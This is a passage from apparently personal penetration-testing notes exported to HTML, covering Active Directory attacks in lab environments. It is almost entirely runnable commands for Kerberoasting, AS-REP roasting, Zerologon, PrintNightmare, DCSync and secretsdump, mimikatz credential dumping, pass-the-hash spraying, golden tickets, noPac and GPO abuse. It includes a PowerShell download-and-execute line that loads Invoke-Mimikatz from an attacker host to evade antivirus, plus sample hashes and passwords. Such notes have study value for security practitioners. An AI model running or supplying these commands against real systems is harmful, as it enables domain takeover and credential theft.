ntpdate pool.ntp.org and ntpdate vulnnet-rst.local(domain we&#39;re attacking) inbetween the actual impacket command seems to make it work once every 10 tries or so, but we just need it once, so nice nice for now.)</span></p><p>impacket-GetUserSPNs -dc-ip 10.10.66.150 &#39;vulnnet-rst.local/t-skid:tj072889*&#39; -request</p><p><span style="color:#234141;"></span></p><p><span style="color:#234141;">From here we hopefully get a kerberoast hash from another user with more information or higher priveleges we can crack and access.</span></p><p></p><p></p><p><span style="color:#234141;">Secretsdump: (dumps all users ntlm-hashes it can access of sorts)</span></p><p>impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat@10.10.176.223</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--GetNPUsers_179.html"></a><h1 class='title level-7'>GetNPUsers</h1><br/><p><span style="color:#234141;">Asreproasting:</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">This attack will only work on users who has kerberos pre-authentification disabled for when requesting tgt to kerberos(i think, kinda)</span></p><p><span style="color:#234141;">After getting a list of usernames on the domain, we can supply this to hopefully get a hash hash back. </span></p><p><span style="color:#234141;">We can get a list of usernames on the domain using enum4linux for instance.</span></p><p></p><p></p><p><img src="images/179-1.png" alt="images/179-1.png" /></p><p></p><p></p><p><span style="color:#234141;">After this, pass the hash around, and/or crack the hash with john, hashcat, or crackstation.</span></p><p></p><p>impacket-GetNPUsers test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -outputfile hashes.txt<code></code></p><p><code></code></p><p></p><p> </p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--GetUserSPNs_178.html"></a><h1 class='title level-7'>GetUserSPNs</h1><br/><p><span style="color:#234141;">Kerberoasting:</span></p><p></p><p><span style="color:#234141;">(You might have to change your time to sync with server. You can try this too: rdate -n 10.10.10.100, or this:</span><span style="color:#234141;"></span></p><p><span style="color:#234141;">ntpdate vulnnet-rst.local. Pausing VM and waiting some minutes and retrying over and over again with variations of this and some from here </span><a href="https://zweilosec.gitbook.io/htb-writeups/windows-machines/insane/apt">https://zweilosec.gitbook.io/htb-writeups/windows-machines/insane/apt</a><span style="color:#234141;"> fixed it eventually&lt;3, kinda lol.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Spamming ntpdate pool.ntp.org and ntpdate vulnnet-rst.local(domain we&#39;re attacking) inbetween the actual impacket command seems to make it work once every 10 tries or so, but we just need it once, so nice nice for now.)</span></p><p>impacket-GetUserSPNs -dc-ip 10.10.66.150 &#39;vulnnet-rst.local/t-skid:tj072889*&#39; -request</p><p><span style="color:#234141;"></span></p><p><span style="color:#234141;">From here we hopefully get a kerberoast hash from another user with more information or higher priveleges we can crack and access.</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--Secretsdump_177.html"></a><h1 class='title level-7'>Secretsdump</h1><br/><p><span style="color:#234141;">Secretsdump: (dumps all users ntlm-hashes it can access of sorts)</span></p><p>impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat@10.10.176.223</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--lookupsid_200.html"></a><h1 class='title level-7'>lookupsid</h1><br/><p><span style="color:#234141;">Checks for sid through rpc using null session for access I believe:</span></p><p>impacket-lookupsid &quot;&quot;:&quot;&quot;@10.10.200.245</p><p></p><p><span style="color:#234141;">Can be useful for finding more users too once you actually have credentials. Although, many other tools for that too. But can still be useful if initial account only has access to rpc. </span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Remember rid can also be enumerated. Use crackmapexec. </span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--rpcdump_184.html"></a><h1 class='title level-7'>rpcdump</h1><br/><p><span style="color:#234141;">RPC dump from utlizing null logon:</span></p><p>impacket-rpcdump vulnnet.local/&quot;&quot;:&quot;&quot;@10.10.36.200</p><p></p><p><span style="color:#234141;">Unsure if this has been useful enough yet.</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--psexec_231.html"></a><h1 class='title level-7'>psexec</h1><br/><p><span style="color:#3f4043;">Another way to log into windows systems</span></p><p></p><p>impacket-psexec RALPH/Administrator@10.11.1.31 -hashes :f58b86e89c8631e432cf1a034662853f</p><p></p><p><img src="images/231-1.png" alt="images/231-1.png" /></p><p></p><p><span style="color:#3f4043;">can be used with rlwrap for better shell:</span></p><p></p><p>rlwrap impacket-psexec RALPH/Administrator@10.11.1.31 -hashes :f58b86e89c8631e432cf1a034662853f</p><p></p><p>impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$target</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--wmiexec_253.html"></a><h1 class='title level-7'>wmiexec</h1><br/><p>rlwrap impacket-wmiexec Administrator@10.11.1.24 -hashes :ee0c207898a5bccc01f38115019ca2fb</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax--smbserver_241.html"></a><h1 class='title level-7'>smbserver</h1><br/><p></p><p><span style="color:#3f4043;">Use -smb2support to avoid error below:</span></p><p>impacket-smbserver share ./ -smb2support</p><p><img src="images/241-1.png" alt="images/241-1.png" /></p><p></p><p></p><p><span style="color:#3f4043;">Use -smb2support -user vk9guest -pass ‘’ to avoid the previous, and following error:</span></p><p>impacket-smbserver share ./ -smb2support -user test -pass &#39;&#39; </p><p><img src="images/241-2.png" alt="images/241-2.png" /></p><p></p><p></p><p>impacket-smbserver share ./ -smb2support -user test -pass &#39;&#39;</p><p><span style="color:#3f4043;">Login like this if you&#39;ve encountered the previous errors:</span></p><p>net use \\192.168.119.231\share /USER:test</p><p><img src="images/241-3.png" alt="images/241-3.png" /></p><p></p><p><span style="color:#3f4043;">Copy file from attacking machine to victim:</span></p><p>copy \\192.168.119.168\share\SharpHound.exe</p><p></p><p><span style="color:#3f4043;">Run binary through the smbshare without saving binary on disk:</span></p><p>\\192.168.119.168\share\winPEASany.exe</p><p></p><p><span style="color:#3f4043;">Copy files from victim to our share on attacking machine:</span></p><p>copy 20220424074629_BloodHound.zip \\192.168.119.213\share</p><p></p><p><span style="color:#3f4043;">Disconnect all shares:</span></p><p>net use * /del /y</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks_109.html"></a><h1 class='title level-5'>Attacks</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Zerologon_165.html"></a><h1 class='title level-6'>Zerologon</h1><br/><p><span style="color:#3f4043;">If you think it&#39;s vulnerable, do this scan to get NetBIOS_Computer_Name and DNS name</span></p><p>nmap -T5 10.11.1.120 -A -v</p><p></p><p></p><p><span style="color:#234141;">Be mindful this attack could be harmful to the environment on real asssessments. Don&#39;t do unless sure it&#39;s safe.</span></p><p></p><p><span style="color:#234141;">If it&#39;s vulnerable to Zerologon, use this empty the password to target machine(Domain Controller if you can):</span></p><p>python3 set_empty_pw.py ZERO-DC 172.31.1.29</p><p></p><p><span style="color:#234141;">Once successful, use this to dump all hashes:</span></p><p>secretsdump.py &#39;Zero.csl0/ZERO-DC$@172.31.1.29&#39;</p><p></p><p><span style="color:#234141;">If once again successful, you have all hashes. You can crack these offline, or use psexec or evil-winrm to access machines</span></p><p></p><p><span style="color:#234141;">Hash-login with psexec:</span></p><p>psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990 Administrator@172.31.1.29</p><p></p><p><span style="color:#234141;">Hash-login with evil-winrm:</span></p><p>evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150</p><p></p><p>=====</p><p></p><p><span style="color:#3f4043;">This scripts works well too:</span></p><p><a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><p></p><p><span style="color:#3f4043;">Syntax of exploit:</span></p><p>python3 cve-2020-1472-exploit.py ‘SV-DC01$’ 10.11.1.20</p><p></p><p><span style="color:#234141;">Once successful, use this to dump all hashes:</span></p><p>impacket-secretsdump -just-dc-ntlm -no-pass &#39;svcorp/SV-DC01$@10.11.1.20&#39;</p><p></p><p>impacket-secretsdump &#39;xor.com/XOR-DC01$@10.11.1.120&#39; -just-dc-ntlm -no-pass</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--DCSync_453.html"></a><h1 class='title level-6'>DCSync</h1><br/><p>DCSync</p><p></p><p><span style="color:#3f4043;">Try this against the DC after you&#39;ve compromised an account, espectially if you cannot smb or winrm into DC</span></p><p></p><p></p><p>impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat@10.10.176.223</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--PrintNightmare_185.html"></a><h1 class='title level-6'>PrintNightmare</h1><br/><p><span style="color:#3f4043;">PrintNightmare</span></p><p><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></p><p></p><p><span style="color:#3f4043;">Enumerate spoolsv. It&#39;s usually located here:</span></p><p>icacls.exe &quot;C:\Windows\System32\spoolsv.exe&quot;</p><p></p><p>powershell -ep bypass . \10.13.31.108\share\CVE-2021-1675.ps1;Invoke-Nightmare </p><p></p><p><img src="images/185-1.png" alt="images/185-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--mimikatz__Hashdump_240.html"></a><h1 class='title level-6'>mimikatz | Hashdump</h1><br/><p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a></p><p></p><p></p><p>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://192.168.119.173/Invoke-Mimikatz.ps1');Invoke-Mimikatz">http://10.11.134.159/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</a></p><p></p><p><span style="color:#3f4043;">This will run in mimikatz in memory and also bypass antivirus. </span></p><p></p><p></p><p>privilege::debug</p><p>token::elevate</p><p>lsadump::lsa /patch</p><p>lsadump::sam</p><p>lsadump::secrets</p><p>sekurlsa::logonpasswords</p><p>sekurlsa::logonpasswords /full</p><p></p><p></p><p><span style="color:#3f4043;">Kerberos: (Check also </span><a href="#Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Golden-silver_ticket__lateral_movement_112.html">Ticket Attacks with mimikatz</a><span style="color:#3f4043;">,</span> <span style="color:#3f4043;">and</span> <a href="#Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Kerberoast_222.html">Kerberoast</a><span style="color:#3f4043;">)</span></p><p>kerberos::list /export</p><p></p><p></p><p></p><p></p><p>========</p><p><span style="color:#3f4043;">This one is not obfuscated same way, but if you struggle to use sekurlsa::logonpasswords or just having issues in general, then try this one:</span></p><p><a href="https://github.com/caday00/mimikatz2.1.1">https://github.com/caday00/mimikatz2.1.1</a></p><p></p><p><span style="color:#3f4043;">Also in /opt/mimikatz2.1.1/</span></p><p></p><p>mimikatz64.exe “privilege::debug” “lsadump::sam” “exit”</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Pass_The_Hash_111.html"></a><h1 class='title level-6'>Pass The Hash</h1><br/><p><a href="https://ptestmethod.readthedocs.io/en/latest/cme.html">https://ptestmethod.readthedocs.io/en/latest/cme.html</a> crackmapexec</p><p></p><p><span style="color:#234141;">You can use enum4linux to sometimes get access to all usernames on domain. Use this list to perform password spraying</span></p><p></p><p><span style="color:#234141;">Next, we spray all the machines on the network with the NTLM hash we hopefully found:</span></p><p></p><p>crackmapexec smb 192.168.231.0/24 -u users.txt -H aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990</p><p></p><p><span style="color:#234141;">After hopefully finding more users, we can access their machines using a few methods that supports hash-logins:</span></p><p></p><p><span style="color:#234141;">Hash-login with psexec:</span></p><p>impacket-psexec administrator@172.31.1.29 -hashes :36242e2cb0b26d16fafd267f39ccf990 </p><p></p><p><span style="color:#234141;">Hash-login with evil-winrm:</span></p><p>evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150</p><p></p><p></p><p></p><p><span style="color:#3f4043;">==============</span></p><p></p><p><span style="color:#3f4043;">After having dumped with mimikatz. sekurlsa::logonpasswords</span></p><p></p><p><span style="color:#3f4043;">Copy all output from mimikatz save it as weee, then do this:</span></p><p></p><p>cat weee | sort | uniq | grep -i ntlm</p><p></p><p><span style="color:#3f4043;">Take those hashes into a file and call it hashes.txt</span></p><p></p><p><span style="color:#3f4043;">Next, to find all users, just type &quot;</span>net users /domain<span style="color:#3f4043;">&quot; in windows machine and copy paste all of those to clipboard.</span></p><p></p><p><span style="color:#3f4043;">Then come to this amazing website I found after 8 tries:</span> <a href="https://design215.com/toolbox/wordlist.php.">https://design215.com/toolbox/wordlist.php.</a><span style="color:#3f4043;"> Check all the boxes, paste, click count words, then copy the new list and add them into a file too, call it users.txt</span></p><p></p><p><span style="color:#3f4043;">Next, make an IP list with all IPs you want to bruteforce. gedit iplist.txt</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">example output:</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">10.11.1.123</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">10.11.1.122</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">10.11.1.121</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">10.11.1.120</span></p><p></p><p><span style="color:#3f4043;">Then run this:</span> <span style="color:#3f4043;">(Do all attacks with both --local-auth and without. It will provide different insight)</span></p><p>crackmapexec smb iplist.txt -u users.txt -H hashes.txt | tee cme_xor_smb.txt</p><p></p><p>crackmapexec winrm iplist.txt -u users.txt -H hashes.txt | tee cme_xor_smb.txt</p><p></p><p>crackmapexec smb svcorp_ip -u uniq_user -H uniq_hash --local-auth | tee cme_svcorp_smb.txt</p><p></p><p><span style="color:#3f4043;">Find the pwned accounts quick after a full bruteforce attempt: </span></p><p>cat cme_xor_smb.txt | grep -b &#39;+&#39;</p><p><img src="images/111-1.png" alt="images/111-1.png" /></p><p></p><p><span style="color:#3f4043;">Keep in mind smb or winrm doesn&#39;t cover impacket-psexec, so test with all. </span></p><p></p><p><span style="color:#3f4043;">Also, if crackmapexec keeps dying after 3 successful hits, simply take that username and place at the bottom of list and see if finds new hits when you restart bruteforcing. </span></p><p></p></div><div class='page'><a name="logy--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Pass_The_Hash--Remote_Hashdump_&_Bruteforce_Hashes_963.html"></a><h1 class='title level-7'>Remote Hashdump & Bruteforce Hashes</h1><br/><p><h1>Dump All Hashes Remotely:</h1></p><p></p><p><span style="color:#237522;">dump SAM - requires local admin</span></p><p>netexec smb 10.10.175.62 -u &#39;user1&#39; -p &#39;Password1!&#39; --sam | fgrep -v &#39;[&#39; | awk -F: &#39;{print $4}&#39; | tee dumped_hashes.txt</p><p></p><p><span style="color:#237522;">dump LSASS - requires local admin</span></p><p>netexec smb 10.10.175.62 -u &#39;user1&#39; -p &#39;Password1!&#39; -M lsassy | fgrep -v &#39;[&#39; | awk &#39;{print $6}&#39; &gt;&gt; dumped_hashes.txt</p><p></p><p><span style="color:#237522;">Dump NTDS.dit - Requires domain admin or local admin on DC</span></p><p>netexec smb 10.10.175.62 -u &#39;user1&#39; -p &#39;Password1!&#39; -M ntdsutil | fgrep -v &#39;[&#39; | awk -F: &#39;{print $4}&#39; &gt;&gt; dumped_hashes.txt</p><p></p><p>impacket-secretsdump &#39;user1&#39;:&#39;Password1!&#39;@10.10.175.62 -just-dc-ntlm -outputfile test.txt</p><p>john test.txt.ntds --wordlist=/usr/share/wordlists/rockyou.txt --format=NT</p><p></p><p><span style="color:#237522;">Clean up creds:</span></p><p>awk &#39;NF {print $1}&#39; dumped_hashes.txt | sort | uniq | tee unique_hashes.txt</p><p>john unique_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT</p><p></p><p><span style="color:#237522;">Get userlist of all users in the domain:</span></p><p>netexec smb 10.10.175.62 -u &#39;user1&#39; -p &#39;Password1!&#39; --rid-brute | grep -i &#39;sidtypeuser&#39; | awk &#39;{print$6}&#39; | cut -d &#39;\&#39; -f2 | tee users.txt</p><p></p><p><span style="color:#237522;">Bruteforce all hashes against all users(check every cred you have against every relevant protocol available):</span></p><p>netexec smb 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success</p><p>netexec winrm 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success</p><p>netexec ldap 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success</p><p>netexec wmi 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success</p><p></p><p><h2>Get shell:</h2></p><p><span style="color:#237522;">Over SMB:</span></p><p>impacket-psexec corp.local/Administrator@10.10.175.62 -hashes :bd839bd6be092b794013e25068820d15</p><p></p><p><span style="color:#237522;">Over WINRM:</span></p><p>evil-winrm -u Administrator -H &#39;bd839bd6be092b794013e25068820d15&#39; -i 10.10.175.62</p><p></p><p><span style="color:#237522;">Over RPC:</span></p><p>impacket-wmiexec corp.local/Administrator@10.10.175.62 -hashes :bd839bd6be092b794013e25068820d15</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Kerberoast_222.html"></a><h1 class='title level-6'>Kerberoast</h1><br/><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p></p><p>powershell -c .\GetUserSPNs.ps1</p><p></p><p>.\mimikatz.exe</p><p>privilege::debug</p><p>kerberos::list /export</p><p></p><p></p><p>/opt/tools/kerberoast</p><p></p><p><span style="color:#3f4043;">Convert kirbi dump to hash for john:</span></p><p>python3 kirbi2john.py 3-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi -o MSSQLSvc.txt</p><p></p><p>john MSSQLSvc.txt --wordlist=/usr/share/wordlists/rockyou.txt</p><p></p><p></p><p></p><p><span style="color:#3f4043;">all useful dumps:</span></p><p></p><p>privilege::debug</p><p>token::elevate</p><p>lsadump::lsa /patch</p><p>lsadump::sam</p><p>sekurlsa::logonpasswords</p><p></p><p></p><p></p><p></p><p><h1>Preferred method:</h1></p><p>wget <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe</a></p><p></p><p>.\Rubeus.exe kerberoast /outfile:hashes.txt</p><p><span style="color:#3f4043;">then copy to kali.. if any hash contain an “:” then try removing it if it fails cracking it...</span></p><p></p><p>.\Rubeus.exe kerberoast /outfile:hashes.txt</p><p><img src="images/222-1.png" alt="images/222-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Kerberoast--Remote_Impacket_229.html"></a><h1 class='title level-7'>Remote Impacket</h1><br/><p><span style="color:#234141;">Kerberoasting:</span></p><p></p><p><span style="color:#234141;">(You might have to change your time to sync with server. You can try this too: rdate -n 10.10.10.100, or this:</span><span style="color:#234141;"></span></p><p><span style="color:#234141;">ntpdate vulnnet-rst.local. Pausing VM and waiting some minutes and retrying over and over again with variations of this and some from here </span><a href="https://zweilosec.gitbook.io/htb-writeups/windows-machines/insane/apt">https://zweilosec.gitbook.io/htb-writeups/windows-machines/insane/apt</a><span style="color:#234141;"> fixed it eventually&lt;3, kinda lol.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Spamming ntpdate pool.ntp.org and ntpdate vulnnet-rst.local(domain we&#39;re attacking) inbetween the actual impacket command seems to make it work once every 10 tries or so, but we just need it once, so nice nice for now.)</span></p><p>impacket-GetUserSPNs -dc-ip 10.10.66.150 &#39;vulnnet-rst.local/t-skid:tj072889*&#39; -request</p><p><span style="color:#234141;"></span></p><p><span style="color:#234141;">From here we hopefully get a kerberoast hash from another user with more information or higher priveleges we can crack and access.</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Kerberoast--On_Windows_230.html"></a><h1 class='title level-7'>On Windows</h1><br/><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p><a href="https://www.youtube.com/watch?v=beRDcvBwTBw">https://www.youtube.com/watch?v=beRDcvBwTBw</a> (kerberoast on windows)</p><p></p><p><a href="https://attack.stealthbits.com/">https://attack.stealthbits.com/</a></p><p></p><p>powershell -c .\GetUserSPNs.ps1</p><p></p><p></p><p><span style="color:#3f4043;">(need to be in powershell for these commands)</span></p><p>Add-Type -AssemblyName System.IdentityModel</p><p>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc/xor-app23.xor.com:1433”</p><p></p><p><span style="color:#3f4043;">then:</span></p><p></p><p>.\mimikatz.exe</p><p>kerberos::list /export</p><p></p><p></p><p>/opt/tools/kerberoast</p><p></p><p><span style="color:#3f4043;">copy kirbi2john.py and kerberos.py to new folder with all kirbi hashes</span></p><p><span style="color:#3f4043;">Convert kirbi dump to hash for john:</span></p><p>python3 kirbi2john.py *.kirbi -o MSSQLSvc.txt</p><p></p><p>john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt</p><p></p><p></p><p></p><p><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></p><p><a href="https://specterops.gitbook.io/ghostpack/rubeus/introduction/command-line-usage">https://specterops.gitbook.io/ghostpack/rubeus/introduction/command-line-usage</a></p><p></p><p></p><p><h1>Preferred method:</h1></p><p></p><p>.\Rubeus.exe kerberoast /outfile:hashes.txt</p><p><span style="color:#3f4043;">then copy to kali.. if any hash contain an “:” then try removing it if it fails cracking it...</span></p><p></p><p>.\Rubeus.exe kerberoast /outfile:hashes.txt</p><p><img src="images/230-1.png" alt="images/230-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Asrep-roasting_163.html"></a><h1 class='title level-6'>Asrep-roasting</h1><br/><p><span style="color:#234141;">This attack will only work on users who has pre-authentification disabled for when requesting tft to kerberos(i think, kinda)</span></p><p><span style="color:#234141;">After getting a list of usernames on the domain, we can supply this to hopefully get a hash hash back. </span></p><p><span style="color:#234141;">We can get a list of usernames on the domain using enum4linux for instance.</span></p><p></p><p></p><p></p><p><img src="images/163-1.png" alt="images/163-1.png" /></p><p></p><p><span style="color:#234141;">After this, pass the hash around, and/or crack the hash with john, hashcat, or crackstation.</span></p><p></p><p>impacket-GetNPUsers -dc-ip 10.10.66.150 vulnnet-rst.local/ -usersfile refined_usernames</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Asrep-roasting--On_Windows_455.html"></a><h1 class='title level-7'>On Windows</h1><br/><p>wget <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe</a></p><p></p><p>.\Rubeus.exe asreproast /outfile:hashes.txt</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Golden-silver_ticket__lateral_movement_112.html"></a><h1 class='title level-6'>Golden/silver ticket | lateral movement</h1><br/><p><h3>Install mimikatz on target machine upon access</h3></p><p>(mimikatz will only be used on target machine)</p><p></p><p>Run mimikatz with .\mimikatz.exe</p><p></p><p><code>privilege::debug</code> ensure this outputs [privilege &quot;20&quot; ok]</p><p></p><p><code>lsadump::lsa /inject /name:krbtgt</code> This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket. You can change the name to Administrator, sqlservice or other accounts you have access to.</p><p></p><p><img src="images/112-1.png" alt="images/112-1.png" /></p><p></p><p>Then fill in information into this command, like this</p><p></p><p>kerberos::golden /user:krbtgt /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:502</p><p></p><p><img src="images/112-2.png" alt="images/112-2.png" /></p><p></p><p><h2>Use the Golden Ticket to access other machine -</h2></p><p>1.) <code>misc::cmd</code> - This will open a new command prompt with elevated privileges to all machines</p><p></p><p>2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network! :)))) yay!</p><p></p><p></p><p>cheers ;)</p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--Responder_167.html"></a><h1 class='title level-6'>Responder</h1><br/><p><span style="color:#234141;">(We usually only really see this in real assessments, and not CTFs, but it can occur)</span></p><p></p><p><span style="color:#234141;">For responder to work you&#39;d usually need to be on the LAN, the internal network. It acts as a LLMNR (LLMNR usually triggers as a second respose if DNS fails on the server). And a DNS fail can be for many reasons, so just keep listening with Responder and you&#39;re likely to get an event if you wait long enough on the internal network.</span></p><p></p><p>python3 /opt/Responder/Responder.py -I tun0</p><p><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><img src="images/167-1.png" alt="images/167-1.png" /></p><p></p><p><span style="color:#234141;">Here we&#39;re calling for the attacker ip inside a redis database. (I kinda think you can select any &quot;folder&quot; here, doesn&#39;t really matter, but regardless, responder is listening and captured an NTLMv2 hash in this case. YUM!)</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--NoPac_(see_if_it_stays)_186.html"></a><h1 class='title level-6'>NoPac (see if it stays?)</h1><br/><p><span style="color:#234141;">primary tool:</span></p><p><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p></p><p><span style="color:#234141;">more indepth explanation:</span></p><p><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p><p></p><p><span style="color:#234141;">It will create a new machine account and use the SAM impersonation to give you the DC machine account.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;">SAM, aka Security Account Manager.</span></p><p></p><p><span style="color:#234141;">You more or less somehow get access to add a new user that&#39;s a domain controller and utilize that user to obviously have full access to domain. Haven&#39;t researched to know the actual details yet.</span></p><p></p><p><span style="color:#234141;">Do this:</span> <span style="color:#234141;">(remember you might need to something like this rdate -n 10.10.190.87, or ntpdate raz0rblack.thm if the clock synchronization messed up)</span></p><p>python3 sam_the_admin.py -dc-ip 10.10.190.87 raz0rblack.thm/twilliams:roastpotatoes</p><p></p><p><span style="color:#234141;">Then do this. The script will practically tell you what to do</span></p><p><img src="images/186-1.png" alt="images/186-1.png" /></p><p></p><p><span style="color:#234141;">Not sure if this is most common way, but food for thought :)</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Attacks--GPO_Abuse_454.html"></a><h1 class='title level-6'>GPO Abuse</h1><br/><p><h3>Abusing GPO: </h3><a href="https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0">https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0</a></p><p>wget <a href="https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe">https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe</a></p><p></p><p></p><p><a href="https://youtu.be/pmaeQlFkFV0?t=1198">https://youtu.be/pmaeQlFkFV0?t=1198</a></p><p><img src="images/454-1.png" alt="images/454-1.png" /></p><p><span style="color:#3f4043;">In this example our compromised user can write to DCPOLICY@SPRAY.CSL, which then has a GPLink to the Domain Controller. This can be abused with SharpGPOAbuse.exe for example:</span></p><p></p><p>SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion_451.html"></a><h1 class='title level-4'>Windows Evasion</h1><br/><p><h3>Sharpshooter, win32 api calls </h3></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AMSI_Bypass_452.html"></a><h1 class='title level-5'>AMSI Bypass</h1><br/><p>AMSI BYPASS: (run this in shell, then run your 